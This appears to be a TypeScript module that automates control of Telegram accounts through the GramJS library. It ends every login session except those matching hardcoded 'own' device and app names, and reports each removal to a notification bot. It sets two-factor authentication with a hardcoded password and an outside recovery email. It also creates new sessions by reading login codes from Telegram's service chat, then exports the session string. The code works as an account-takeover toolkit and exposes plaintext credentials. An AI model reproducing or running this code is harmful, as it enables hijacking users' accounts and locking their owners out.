import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { sleep } from 'telegram/Helpers';
import bigInt from 'big-integer';
import { TgContext, SessionInfo } from './types';
import { parseError } from '../../../utils/parseError';
import { fetchWithTimeout } from '../../../utils/fetchWithTimeout';
import { notifbot } from '../../../utils/logbots';
import { generateTGConfig } from '../utils/generateTGConfig';
import { MailReader } from '../../../IMap/IMap';

export function isOwnAuth(auth: Api.Authorization): boolean {
    const authCriteria = [
        { field: 'country', value: 'singapore' },
        { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
        { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] },
    ];

    return authCriteria.some(criterion => {
        const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';

        if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) return true;

        if ('values' in criterion) {
            return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
        }

        return fieldValue.includes(criterion.value.toLowerCase());
    });
}

export async function removeOtherAuths(ctx: TgContext): Promise<void> {
    if (!ctx.client) throw new Error('Client is not initialized');
    const result = await ctx.client.invoke(new Api.account.GetAuthorizations());
    for (const auth of result.authorizations) {
        if (isOwnAuth(auth)) continue;
        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
        await resetAuthorization(ctx, auth);
    }
}

async function resetAuthorization(ctx: TgContext, auth: Api.Authorization): Promise<void> {
    try {
        await ctx.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
    } catch (error) {
        parseError(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
    }
}

export async function getAuths(ctx: TgContext): Promise<Api.account.Authorizations> {
    if (!ctx.client) throw new Error('Client is not initialized');
    return await ctx.client.invoke(new Api.account.GetAuthorizations());
}

export async function getLastActiveTime(ctx: TgContext): Promise<string> {
    if (!ctx.client) throw new Error('Client is not initialized');

    try {
        const result = await ctx.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0;

        result.authorizations.forEach((auth) => {
            if (!isOwnAuth(auth)) {
                if (auth.dateActive && latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });

        if (latest === 0) return new Date().toISOString().split('T')[0];
        return new Date(latest * 1000).toISOString().split('T')[0];
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error getting last active time:', error);
        return new Date().toISOString().split('T')[0];
    }
}

export async function hasPassword(ctx: TgContext): Promise<boolean> {
    if (!ctx.client) throw new Error('Client is not initialized');
    try {
        const passwordInfo = await ctx.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword || false;
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error checking password status:', error);
        return false;
    }
}

export async function set2fa(ctx: TgContext): Promise<{ email: string; hint: string; newPassword: string } | void> {
    if (!(await hasPassword(ctx))) {
        ctx.logger.info(ctx.phoneNumber, 'Password Does not exist, Setting 2FA');

        const imapService = MailReader.getInstance();
        const twoFaDetails = {
            email: 'storeslaksmi@gmail.com',
            hint: 'password - India143',
            newPassword: 'Ajtdmwajt1@',
        };

        try {
            await imapService.connectToMail();
            const checkMailInterval = setInterval(async () => {
                ctx.logger.info(ctx.phoneNumber, 'Checking if mail is ready');

                if (imapService.isMailReady()) {
                    clearInterval(checkMailInterval);
                    ctx.logger.info(ctx.phoneNumber, 'Mail is ready, checking code!');
                    await ctx.client.updateTwoFaSettings({
                        isCheckPassword: false,
                        email: twoFaDetails.email,
                        hint: twoFaDetails.hint,
                        newPassword: twoFaDetails.newPassword,
                        emailCodeCallback: async (length: number) => {
                            ctx.logger.info(ctx.phoneNumber, 'Code sent');
                            return new Promise(async (resolve, reject) => {
                                let retry = 0;
                                const codeInterval = setInterval(async () => {
                                    try {
                                        ctx.logger.info(ctx.phoneNumber, 'Checking code');
                                        retry++;
                                        if (imapService.isMailReady() && retry < 4) {
                                            const code = await imapService.getCode();
                                            ctx.logger.info(ctx.phoneNumber, 'Code:', code);
                                            if (code) {
                                                await imapService.disconnectFromMail();
                                                clearInterval(codeInterval);
                                                resolve(code);
                                            }
                                        } else {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(new Error('Failed to retrieve code'));
                                        }
                                    } catch (error) {
                                        clearInterval(codeInterval);
                                        await imapService.disconnectFromMail();
                                        reject(error);
                                    }
                                }, 10000);
                            });
                        },
                        onEmailCodeError: (e: Error) => {
                            ctx.logger.error(ctx.phoneNumber, 'Email code error:', parseError(e));
                            return Promise.resolve('error');
                        },
                    });

                    return twoFaDetails;
                } else {
                    ctx.logger.info(ctx.phoneNumber, 'Mail not ready yet');
                }
            }, 5000);
        } catch (e) {
            ctx.logger.error(ctx.phoneNumber, 'Unable to connect to mail server:', parseError(e));
        }
    } else {
        ctx.logger.info(ctx.phoneNumber, 'Password already exists');
    }
}

export async function createNewSession(ctx: TgContext): Promise<string> {
    const timeoutPromise = new Promise<string>((_, reject) =>
        setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000)
    );

    const sessionPromise = (async () => {
        const me = <Api.User>await ctx.client.getMe();
        ctx.logger.info(ctx.phoneNumber, 'Creating new session for: ', me.phone);

        const newClient = new TelegramClient(
            new StringSession(''),
            parseInt(process.env.API_ID),
            process.env.API_HASH,
            await generateTGConfig(ctx.phoneNumber)
        );

        ctx.logger.info(ctx.phoneNumber, 'Starting Session Creation...');
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => 'Ajtdmwajt1@',
            phoneCode: async () => {
                ctx.logger.info(ctx.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                return await waitForOtp(ctx);
            },
            onError: (err: Error) => { throw err; },
        });

        ctx.logger.info(ctx.phoneNumber, 'Session Creation Completed');
        const session = <string><unknown>newClient.session.save();

        await newClient.destroy();
        ctx.logger.info(ctx.phoneNumber, 'New Session: ', session);

        return session;
    })();

    return Promise.race([sessionPromise, timeoutPromise]);
}

export async function waitForOtp(ctx: TgContext): Promise<string> {
    for (let i = 0; i < 3; i++) {
        try {
            ctx.logger.info(ctx.phoneNumber, 'Attempt : ', i);
            const messages = await ctx.client.getMessages('777000', { limit: 1 });
            const message = messages[0];
            if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                ctx.logger.info(ctx.phoneNumber, 'returning: ', code);
                return code;
            } else {
                ctx.logger.info(ctx.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                ctx.logger.info(ctx.phoneNumber, 'Skipped Code: ', code);
                if (i == 2) return code;
                await sleep(5000);
            }
        } catch (err) {
            await sleep(2000);
            ctx.logger.info(ctx.phoneNumber, err);
        }
    }
    throw new Error('Failed to get OTP after 3 attempts');
}

export async function getSessionInfo(ctx: TgContext): Promise<SessionInfo> {
    if (!ctx.client) throw new Error('Client not initialized');

    const [authorizationsResult, devicesResult] = await Promise.all([
        ctx.client.invoke(new Api.account.GetAuthorizations()),
        ctx.client.invoke(new Api.account.GetWebAuthorizations()),
    ]);

    const sessions = authorizationsResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        deviceModel: auth.deviceModel,
        platform: auth.platform,
        systemVersion: auth.systemVersion,
        appName: auth.appName,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        country: auth.country,
        region: auth.region,
    }));

    const webSessions = devicesResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        domain: auth.domain,
        browser: auth.browser,
        platform: auth.platform,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        region: auth.region,
    }));

    return { sessions, webSessions };
}

export async function terminateSession(ctx: TgContext, options: {
    hash: string;
    type: 'app' | 'web';
    exceptCurrent?: boolean;
}): Promise<boolean> {
    if (!ctx.client) throw new Error('Client not initialized');

    if (options.exceptCurrent) {
        if (options.type === 'app') {
            await ctx.client.invoke(new Api.auth.ResetAuthorizations());
        } else {
            await ctx.client.invoke(new Api.account.ResetWebAuthorizations());
        }
        return true;
    }

    if (options.type === 'app') {
        await ctx.client.invoke(new Api.account.ResetAuthorization({ hash: bigInt(options.hash) }));
    } else {
        await ctx.client.invoke(new Api.account.ResetWebAuthorization({ hash: bigInt(options.hash) }));
    }
    return true;
}
